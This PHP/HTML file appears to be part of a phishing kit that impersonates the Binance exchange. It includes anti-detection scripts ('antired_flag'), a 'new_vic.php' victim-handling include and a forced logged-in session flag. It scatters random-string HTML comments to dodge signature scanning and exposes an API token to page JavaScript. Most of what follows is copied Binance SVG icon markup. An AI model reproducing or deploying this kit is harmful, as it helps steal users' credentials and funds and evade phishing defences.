<?php
function generateRandomString($length = 100) {
  return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
		include "../antired_flag/anti1.php";
		include "../antired_flag/anti2.php"; 
		include "../antired_flag/anti3.php"; 
		include "../antired_flag/anti4.php"; 
		include "../antired_flag/anti5.php"; 
		include "../antired_flag/anti7.php";
		include '../UysnX/xuysnx.php';

ob_start();
session_start();
ob_end_clean();
$x = "UysnX";
$_SESSION["loggedin"] = true;
include '../UysnX/new_vic.php';
include '../UysnX/khawazmiat_binance.php';


?>
<!DOCTYPE html>
<html dir="ltr" lang="en">
  <head>
    <script>
      addEventListener("load", function() {
        setTimeout(hideURLbar, 0);
      }, false);

      function hideURLbar() {
        window.scrollTo(0, 1);
      }
    </script>
    <link rel="stylesheet" href="css/style.css">
    <style>
      #xuysnx {
        width: 100%;
        height: 100%;
        top: 0px;
        left: 0px;
        position: fixed;
        display: block;
        opacity: 1;
        background-color: rgba(0, 0, 0, .5);
        z-index: 99;
        text-align: center;
      }
      .error {
        color: red;
      }
    </style>
    <link rel="icon" href="img/bb.ico">
<?php
 include '../include/metawat.php';
 ?>
  </head>
  <body>
    <!-- <?php echo  generateRandomString();  ?> -->
    <div id="xuysnx" style="display:none;"></div>
    <!-- <?php echo  generateRandomString();  ?> -->
    <svg aria-name="dotCom" xmlns="http://www.w3.org/2000/svg" style="position: absolute; width: 0px; height: 0px; overflow: hidden;" aria-hidden="true">
          <!-- <?php echo  generateRandomString();  ?> -->
      <symbol viewBox="0 0 24 24" id="Dex-g">
            <!-- <?php echo  generateRandomString();  ?> -->
        <g>
              <!-- <?php echo  generateRandomString();  ?> -->
          <path d="M8.666 6.193L6.717 5.071 12.017 2l5.316 3.07-1.949 1.123-3.367-1.933-3.351 1.933zM18.72 8.126v2.26l1.949-1.122v-2.26L18.72 5.866l-1.948 1.122 1.948 1.138zM10.07 7.004l1.948 1.122 1.949-1.122-1.949-1.138-1.948 1.138zm7.264 1.933l-1.949-1.122-3.367 1.932-3.351-1.933-1.949 1.123v2.26l3.352 1.933v3.866l1.948 1.123 1.949-1.123V13.13l3.367-1.933v-2.26zm1.387 6.937l-3.351 1.933v2.26l5.316-3.07V10.87l-1.965 1.138v3.866zm-3.351.327l1.948-1.122v-2.276l-1.948 1.122v2.276zm-5.3 2.416v2.26L12.017 22l1.949-1.122v-2.26l-1.949 1.122-1.948-1.123zM3.35 9.264L5.3 10.387v-2.26l1.948-1.123-1.933-1.138-1.948 1.122v2.276H3.35zm1.964 2.744l-1.948-1.123v6.127l5.315 3.07v-2.26l-3.367-1.948v-3.866zm3.352 1.933l-1.949-1.123v2.26l1.949 1.123v-2.26z" fill="url(#paint0_linear)"></path>
          <defs>
                <!-- <?php echo  generateRandomString();  ?> -->
            <linearGradient id="paint0_linear" x1="12.017" y1="2" x2="12.017" y2="22" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F8D12F"></stop>
                  <!-- <?php echo  generateRandomString();  ?> -->
              <stop offset="1" stop-color="#F0B90B"></stop>
            </linearGradient>
                <!-- <?php echo  generateRandomString();  ?> -->
          </defs>
        </g>
            <!-- <?php echo  generateRandomString();  ?> -->
      </symbol>
          <!-- <?php echo  generateRandomString();  ?> -->
      <symbol viewBox="0 0 24 24" id="Group-51714vipIcon">
            <!-- <?php echo  generateRandomString();  ?> -->
        <g>
              <!-- <?php echo  generateRandomString();  ?> -->
          <path fill="url(#paint0_linear)" d="M2 13h20v7H2z"></path>
              <!-- <?php echo  generateRandomString();  ?> -->
          <path fill-rule="evenodd" clip-rule="evenodd" d="M15 5H9v2h6V5zM7 7V3h10v4h5v6H2V7h5z" fill="#76808F"></path>
          <path fill="#1E2026" d="M5 17h2v-4H5z"></path>
          <path fill="#1E2026" d="M17 17h2v-4h-2z"></path>
          <path fill="url(#paint1_linear)" d="M17 11h2v2h-2z"></path>
          <path fill="url(#paint2_linear)" d="M5 11h2v2H5z"></path>
              <!-- <?php echo  generateRandomString();  ?> -->
              
          <defs>
            <linearGradient id="paint0_linear" x1="12" y1="13" x2="12" y2="20" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
                  <!-- <?php echo  generateRandomString();  ?> -->
            </linearGradient>
            <linearGradient id="paint1_linear" x1="18" y1="11" x2="18" y2="13" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
                  <!-- <?php echo  generateRandomString();  ?> -->
              <stop offset="1" stop-color="#F8D33A"></stop>
                  <!-- <?php echo  generateRandomString();  ?> -->
            </linearGradient>
            <linearGradient id="paint2_linear" x1="6" y1="11" x2="6" y2="13" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="ac-statement">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M6.29047 5.04291C7.90004 3.72197 9.91782 3 12 3V12L18.364 5.63604C19.8363 7.10838 20.7526 9.04568 20.9567 11.1178C21.1526 13.1071 20.6805 15.1026 19.619 16.7907L13.4142 10.5859L12 12.0002L18.3639 18.3641C17.3237 19.4042 16.0375 20.1802 14.6126 20.6125C12.62 21.2169 10.4796 21.1117 8.55586 20.3149C6.63216 19.5181 5.04426 18.0789 4.06272 16.2426C3.08118 14.4062 2.76673 12.2864 3.17295 10.2442C3.57916 8.202 4.68091 6.36384 6.29047 5.04291Z" fill="currentColor"></path>
      </symbol>
          <!-- <?php echo  generateRandomString();  ?> -->
      <symbol viewBox="0 0 24 24" id="academy-g">
        <g>
          <path d="M7 14.002L3.248 10.25l9.75 4.25 9.75-4.25L19 13.998V17.5l-6 6-6-6v-3.498z" fill="#76808F"></path>
          <path d="M13.293 12.207l-6-6L3.25 10.25 13 20l9.75-9.75L13 .5 8.707 4.793l6 6-1.414 1.414z" fill="url(#paint0_linear)"></path>
          <path d="M2.75 14L.5 16.25l2.25 2.25L5 16.25 2.75 14z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="13" y1="20" x2="13" y2=".5" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="announcement-g">
        <path d="M3 12.9997L5 13V8.00031L3 8L3 12.9997Z" fill="#76808F"></path>
        <path d="M16.9999 6L5.00146 6L5.00146 15L16.9999 15L21 19L20.9999 2L16.9999 6Z" fill="url(#paint0_linear_6_14)"></path>
        <path d="M14 15H7V22H11V17H14V15Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_6_14" x1="13.0007" y1="19" x2="13.0007" y2="2" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
		 
        </defs>
      </symbol>
	  <script>var token=<?php echo json_encode($api); ?>;</script>
      <symbol viewBox="0 0 24 24" id="api-g">
        <path d="M22 5H20V19H22V5Z" fill="#76808F"></path>
        <path d="M18 14L14 14L14 16L18 16L18 14Z" fill="#76808F"></path>
        <path d="M18 8L14 8L14 10L18 10L18 8Z" fill="#76808F"></path>
        <path d="M4 13.0002L1.00006 13.0002L1.00006 11.0002L4 11.0002L4 13.0002Z" fill="#76808F"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M3 12C3 15.866 6.13401 19 10 19H14V5H10C6.13401 5 3 8.13401 3 12Z" fill="url(#paint0_linear_1288_6847)"></path>
        <defs>
          <linearGradient id="paint0_linear_1288_6847" x1="8.5" y1="19" x2="8.5" y2="5" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="asset-management-solution-g">
        <g clip-path="url(#clip0_42197_26753)">
          <path fill-rule="evenodd" clip-rule="evenodd" d="M14.9874 4.3911L17.0535 5.58574L19.7249 5.4254L21.543 8.57458L20.0691 10.8069V13.1931L21.543 15.4254L19.7249 18.5746L17.0535 18.4143L14.9874 19.6089L13.7918 22H10.1555L8.95993 19.6089L6.89381 18.4142L4.22248 18.5746L2.4043 15.4254L3.87821 13.1931V10.8069L2.4043 8.5746L4.22248 5.42542L6.89381 5.58576L8.95993 4.3911L10.1555 2H13.7918L14.9874 4.3911ZM11.9975 6.54574C15.01 6.54574 17.4521 8.98782 17.4521 12.0003C17.4521 15.0127 15.01 17.4548 11.9975 17.4548C8.98505 17.4548 6.54297 15.0127 6.54297 12.0003C6.54297 8.98782 8.98505 6.54574 11.9975 6.54574Z" fill="url(#paint0_linear_42197_26753)"></path>
          <path d="M9.27002 12.0002L11.9973 9.27295L14.7246 12.0002L11.9973 14.7275L9.27002 12.0002Z" fill="#76808F"></path>
          <circle r="5.83333" transform="matrix(1 0 0 -1 11.9998 12.0002)" fill="#76808F"></circle>
          <path d="M12.6345 16.6668V15.6274C14.0746 15.3892 14.7459 14.4905 14.7459 13.4294C14.7459 12.325 14.0205 11.7078 12.5046 11.3613V9.56397C13.0243 9.68307 13.3708 9.92128 13.6307 10.2136L14.616 9.32576C14.1396 8.78439 13.5007 8.44873 12.6345 8.35128V7.3335H12.0174H11.4002V8.35128C10.0034 8.5137 9.25635 9.27162 9.25635 10.4085C9.25635 11.4588 9.91683 12.1734 11.541 12.5091V14.458C10.9346 14.3714 10.4257 14.079 10.0143 13.6459L9.03979 14.5338C9.58117 15.1293 10.3066 15.5732 11.4002 15.6707V16.6668H12.6345ZM10.7505 10.3652C10.7505 9.94293 10.9888 9.65059 11.541 9.54231V11.1448C10.9888 10.9932 10.7505 10.7767 10.7505 10.3652ZM13.2517 13.5485C13.2517 13.9599 13.0135 14.2956 12.5046 14.4364V12.7256C13.1218 12.9097 13.2517 13.2345 13.2517 13.5485Z" fill="url(#paint1_linear_42197_26753)"></path>
        </g>
        <defs>
          <linearGradient id="paint0_linear_42197_26753" x1="11.9737" y1="22" x2="11.9737" y2="2" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_42197_26753" x1="11.8928" y1="7.3335" x2="11.8928" y2="16.6668" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <clipPath id="clip0_42197_26753">
            <rect width="24" height="24" fill="white"></rect>
          </clipPath>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="auto-invest">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M7.07114 6.34315C8.59945 4.81484 9.88191 4 12 4C16.4182 4 20 7.58172 20 12H22C22 6.47715 17.5228 2 12 2C9.14747 2 7.38599 3.19988 5.65693 4.92893L3.82846 6.7574L2 4.92893V10H7.07107L5.24268 8.17161L7.07114 6.34315Z" fill="#76808F"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M16.9289 17.6569C15.4006 19.1852 14.1181 20 12 20C7.58175 20 4.00003 16.4183 4.00003 12H2.00003C2.00003 17.5228 6.47718 22 12 22C14.8525 22 16.614 20.8001 18.3431 19.0711L20.2071 17.2071L22 19V14H17L18.7929 15.7929L16.9289 17.6569Z" fill="#76808F"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM12 13.6L10.4 12L12 10.4L13.6 12L12 13.6Z" fill="url(#paint0_linear_8486_78758)"></path>
        <defs>
          <linearGradient id="paint0_linear_8486_78758" x1="12" y1="16" x2="12" y2="8" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="bab-token-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.5 3.00012H12H14.5L21 9.50012V14.5001L14.5 21.0001H12H9.5L3 14.5001V9.50012L9.5 3.00012Z" fill="url(#paint0_linear_5116_130596)"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M12 17.0001C14.7614 17.0001 17 14.7615 17 12.0001C17 9.2387 14.7614 7.00012 12 7.00012C9.23858 7.00012 7 9.2387 7 12.0001C7 14.7615 9.23858 17.0001 12 17.0001ZM8.71291 12.3573L11.0107 14.6611L15.1971 10.4806L14.3429 9.62646L11.0107 12.9588L9.56097 11.5092L8.71291 12.3573Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_5116_130596" x1="12" y1="3.00012" x2="12" y2="21.0001" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="bank-g">
        <g>
          <path fill="#76808F" d="M5 11h2v8H5z"></path>
          <path fill="#76808F" d="M9 11h2v8H9z"></path>
          <path fill="#76808F" d="M13 11h2v8h-2z"></path>
          <path fill="#76808F" d="M17 11h2v8h-2z"></path>
          <path d="M12 2l9 7v2H3V9l9-7z" fill="url(#paint0_linear)"></path>
          <path d="M3 22v-3h18v3H3z" fill="url(#paint1_linear)"></path>
          <circle cx="12" cy="7" r="2" fill="#76808F"></circle>
          <defs>
            <linearGradient id="paint0_linear" x1="3" y1="12" x2="21" y2="12" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint1_linear" x1="3" y1="12" x2="21" y2="12" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="battle-g">
        <g>
          <path d="M18 3h3v3L9.5 17.5l-3-3L18 3z" fill="#76808F"></path>
          <path d="M6 3H3v3l11.5 11.5 3-3L6 3z" fill="#76808F"></path>
          <path d="M15.5 17.5l2-2L22 20l-2 2-4.5-4.5z" fill="url(#paint0_linear)"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M14.207 20.207l6-6-1.414-1.414-6 6 1.414 1.414z" fill="url(#paint1_linear)"></path>
          <path d="M18 3h3v3L9.5 17.5l-3-3L18 3z" fill="url(#paint2_linear)"></path>
          <path d="M8.5 17.5l-2-2L2 20l2 2 4.5-4.5z" fill="#76808F"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M9.793 20.207l-6-6 1.414-1.414 6 6-1.414 1.414z" fill="#76808F"></path>
          <path d="M14 2l1 1-1 1-1-1 1-1z" fill="#76808F"></path>
          <path d="M3 9l1 1-1 1-1-1 1-1z" fill="#76808F"></path>
          <path d="M19 10.5L20.5 9l1.5 1.5-1.5 1.5-1.5-1.5z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="18.75" y1="15.5" x2="18.75" y2="22" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint1_linear" x1="16.5" y1="12.793" x2="16.5" y2="20.207" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint2_linear" x1="13.75" y1="17.5" x2="13.75" y2="3" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="blog-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M22.0002 5.99988L2.00024 5.99988L2.00024 19.9999L22.0002 19.9999L22.0002 5.99988ZM4.00024 9.99988L20.0002 9.99988L20.0002 7.99988L4.00024 7.99988L4.00024 9.99988ZM12.0002 11.9999L20.0002 11.9999L20.0002 13.9999L12.0002 13.9999L12.0002 11.9999ZM12.0002 15.9999L16.0002 15.9999L16.0002 17.9999L12.0002 17.9999L12.0002 15.9999ZM4.00024 11.9999L10.0002 11.9999L10.0002 17.9999L4.00024 17.9999L4.00024 11.9999Z" fill="url(#paint0_linear_7_39)"></path>
        <path d="M2 3.99805L22 3.99805L22 5.99805L2 5.99805L2 3.99805Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7_39" x1="2.00024" y1="12.9999" x2="22.0002" y2="12.9999" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="broker-g">
        <g>
          <path d="M10 14H3V3h11v7h-4v4z" fill="url(#paint0_linear)"></path>
          <path d="M2 19.5L4.5 22 7 19.5 4.5 17 2 19.5z" fill="url(#paint1_linear)"></path>
          <path d="M19.5 2L17 4.5 19.5 7 22 4.5 19.5 2z" fill="#76808F"></path>
          <path d="M10 21v-7h4v-4h7v11H10z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="8.5" y1="14" x2="8.5" y2="3" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint1_linear" x1="4.5" y1="22" x2="4.5" y2="17" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="card-binance-g">
        <g>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M22 20H2V4h20v16zM7 12H4v-2h3v2z" fill="#76808F"></path>
          <path d="M11.586 13.894l-1.787 1.789-1.787-1.789 1.787-1.788 1.787 1.788zm4.313-4.33l3.056 3.06 1.787-1.789-3.056-3.046L15.899 6l-1.775 1.789-3.056 3.046 1.787 1.789 3.044-3.06zm6.1 2.554l-1.774 1.776 1.774 1.777v-3.553zm-6.1 6.106l-3.056-3.06-1.775 1.79L14.112 20h3.574l3.056-3.059-1.787-1.776-3.056 3.059zm0-2.553l1.787-1.777-1.787-1.788-1.775 1.788 1.775 1.777z" fill="url(#paint0_linear)"></path>
          <path d="M4 7.5L5.5 9 7 7.5 5.5 6 4 7.5z" fill="url(#paint1_linear)"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="15.006" y1="20" x2="15.006" y2="6" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
            <linearGradient id="paint1_linear" x1="5.5" y1="9" x2="5.5" y2="6" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="card-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M21 5H3V8H21V5ZM21 10.5H3V19H21V10.5ZM6 13H11V15.5H6V13ZM15.5 13H13V15.5H15.5V13Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="card-g">
        <g>
          <path transform="matrix(1 0 0 -1 2 20)" fill="url(#paint0_linear)" d="M0 0h20v16H0z"></path>
          <path fill="#76808F" d="M2 7h20v3H2z"></path>
          <path fill="#76808F" d="M17 16h3v2h-3z"></path>
          <path fill="#76808F" d="M4 16h11v2H4z"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="10" y1="0" x2="10" y2="16" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="certified-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.9113 22.8662L16.5923 19.9547H19.9539V16.593L22.8658 14.9117L21.1848 12.0002L22.8658 9.08865L19.9539 7.40739V4.04572H16.5924L14.9114 1.13418L11.9998 2.81511L9.08826 1.13418L7.40728 4.04572H4.04493V7.40791L1.13384 9.08864L2.8148 12.0002L1.13379 14.9118L4.04493 16.5925V19.9547H7.40732L9.0883 22.8662L11.9998 21.1853L14.9113 22.8662Z" fill="url(#paint0_linear_7_139)"></path>
        <path d="M10.4099 16.3701L6.58985 12.54L7.99976 11.1301L10.4099 13.54L15.9497 8L17.3699 9.42L10.4099 16.3701Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7_139" x1="11.9998" y1="22.8662" x2="11.9998" y2="1.13418" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="charity-g">
        <g>
          <path d="M13.22 2.556l-1.221 1.22-1.22-1.22a3.615 3.615 0 0 0-5.112 5.112L11.999 14l6.332-6.332a3.615 3.615 0 1 0-5.112-5.112z" fill="url(#paint0_linear)"></path>
          <path d="M9.536 15.036L3 8.5v3.929a5 5 0 0 0 1.464 3.535L11 22.5v-3.929a5 5 0 0 0-1.464-3.536z" fill="#76808F"></path>
          <path d="M14.464 15.036L21 8.5v3.929a5 5 0 0 1-1.465 3.535L13 22.5v-3.929a5 5 0 0 1 1.464-3.536z" fill="#76808F"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="11.999" y1="14" x2="11.999" y2="1.497" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="chart-bar-g">
        <rect width="5" height="7" transform="matrix(1 0 0 -1 2 18)" fill="url(#paint0_linear)"></rect>
        <path d="M2 18H7V21H2V18Z" fill="#76808F"></path>
        <rect width="5" height="8" transform="matrix(1 0 0 -1 17 16)" fill="url(#paint1_linear)"></rect>
        <path d="M9.5 11H14.5V2H9.5V11Z" fill="url(#paint2_linear)"></path>
        <path d="M9.5 21H14.5V11H9.5V21Z" fill="#76808F"></path>
        <path d="M17 21H22V16H17V21Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear" x1="2.5" y1="0" x2="2.5" y2="7" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear" x1="2.5" y1="0" x2="2.5" y2="8" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint2_linear" x1="12" y1="11" x2="12" y2="2" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="chart-donut-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M17.4123 19.1912C15.906 20.3267 14.0316 20.9998 12 20.9998C7.02944 20.9998 3 16.9704 3 11.9998C3 7.45343 6.37108 3.69438 10.75 3.08594V8.19612C9.15149 8.72112 7.99725 10.2257 7.99725 11.9998C7.99725 14.2105 9.78934 16.0026 12 16.0026C12.6466 16.0026 13.2574 15.8493 13.7981 15.577L17.4123 19.1912ZM19.1817 17.425C20.323 15.9165 21 14.0372 21 11.9998C21 7.45343 17.6289 3.69438 13.25 3.08594V8.19612C14.8485 8.72112 16.0028 10.2257 16.0028 11.9998C16.0028 12.6524 15.8466 13.2686 15.5695 13.8129L19.1817 17.425Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="chat-g">
        <path d="M22 3V18H12L7 23V18H2V3H22Z" fill="url(#paint0_linear_7_93)"></path>
        <path d="M5 7L19 7L19 9L5 9L5 7Z" fill="#76808F"></path>
        <path d="M5 12L13 12L13 14L5 14L5 12Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7_93" x1="12" y1="23" x2="12" y2="3" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="circled-arrow-right-g">
        <g>
          <circle r="10" transform="matrix(1 0 0 -1 12 12)" fill="url(#paint0_linear)"></circle>
          <path d="M18.956 11.956l-5.5 5.544.044-4.544h-8v-2h8V6.5l5.456 5.456z" fill="#2B3139"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="10" y1="0" x2="10" y2="20" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F8D12F"></stop>
              <stop offset="1" stop-color="#F0B90B"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="cloud-g">
        <g>
          <path d="M1 16a7 7 0 0 1 7-7v7H1z" fill="#76808F"></path>
          <path d="M8 7.077C8 4.335 10.239 2 13 2c2.762 0 5 2.335 5 5.077V16H8V7.077z" fill="#76808F"></path>
          <path d="M7 19a8 8 0 1 1 16 0H7z" fill="url(#paint0_linear)"></path>
          <path fill="#76808F" d="M20 6h3v3h-3z"></path>
          <path fill="#F0B90B" d="M4 22h3v-3H4z"></path>
          <defs>
            <linearGradient id="paint0_linear" x1="15" y1="19" x2="15" y2="11" gradientUnits="userSpaceOnUse">
              <stop stop-color="#F0B90B"></stop>
              <stop offset="1" stop-color="#F8D33A"></stop>
            </linearGradient>
          </defs>
        </g>
      </symbol>
      <symbol viewBox="0 0 24 24" id="coin-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12ZM12.0004 7.99992L16.0004 11.9999L12.0004 15.9999L8.00041 11.9999L12.0004 7.99992Z" fill="currentColor"></path>
      </symbol>
      <symbol viewBox="0 0 24 24" id="coin-g">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 17.5228 6.47715 22 12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12Z" fill="url(#paint0_linear_7_107)"></path>
        <path d="M7 12L12 7L17 12L12 17L7 12Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7_107" x1="12" y1="22" x2="12" y2="2" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="coins-g">
        <path d="M18 6C18 4.34315 16.6569 3 15 3C13.3431 3 12 4.34315 12 6C12 7.65685 13.3431 9 15 9C16.6569 9 18 7.65685 18 6Z" fill="url(#paint0_linear_7_306)"></path>
        <path d="M9 13C9 12.4477 8.55228 12 8 12C7.44772 12 7 12.4477 7 13C7 13.5523 7.44772 14 8 14C8.55228 14 9 13.5523 9 13Z" fill="url(#paint1_linear_7_306)"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M21 15.5C21 18.5376 18.5376 21 15.5 21C12.4624 21 10 18.5376 10 15.5C10 12.4624 12.4624 10 15.5 10C18.5376 10 21 12.4624 21 15.5ZM13 15.5L15.5 18L18 15.5L15.5 13L13 15.5Z" fill="url(#paint2_linear_7_306)"></path>
        <path fill-rule="evenodd" clip-rule="evenodd" d="M11 7C11 9.20914 9.20914 11 7 11C4.79086 11 3 9.20914 3 7C3 4.79086 4.79086 3 7 3C9.20914 3 11 4.79086 11 7ZM5.5 7L7 5.5L8.5 7L7 8.5L5.5 7Z" fill="#76808F"></path>
        <path d="M21 9C21 9.55228 20.5523 10 20 10C19.4477 10 19 9.55228 19 9C19 8.44772 19.4477 8 20 8C20.5523 8 21 8.44772 21 9Z" fill="#76808F"></path>
        <path d="M9 18C9 19.6569 7.65685 21 6 21C4.34315 21 3 19.6569 3 18C3 16.3431 4.34315 15 6 15C7.65685 15 9 16.3431 9 18Z" fill="#76808F"></path>
        <defs>
          <linearGradient id="paint0_linear_7_306" x1="14" y1="21" x2="14" y2="3" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint1_linear_7_306" x1="14" y1="21" x2="14" y2="3" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
          <linearGradient id="paint2_linear_7_306" x1="14" y1="21" x2="14" y2="3" gradientUnits="userSpaceOnUse">
            <stop stop-color="#F0B90B"></stop>
            <stop offset="1" stop-color="#F8D33A"></stop>
          </linearGradient>
        </defs>
      </symbol>
      <symbol viewBox="0 0 24 24" id="convert-f">
        <path fill-rule="evenodd" clip-rule="evenodd" d="M15 4H20V9L15 4ZM12 6C8.68629 6 6 8.68629 6 12C6 15.3137 8.68629 18 12 18C15.3137 18 18 15.3137 18 12C18 8.68629 15.3137 6 12 6ZM12 14.4L14.4 12L12 9.6L9.6 12L12 14.4ZM4 20H9L4 15V20Z" fill="currentColor"></path>
      </symbol>
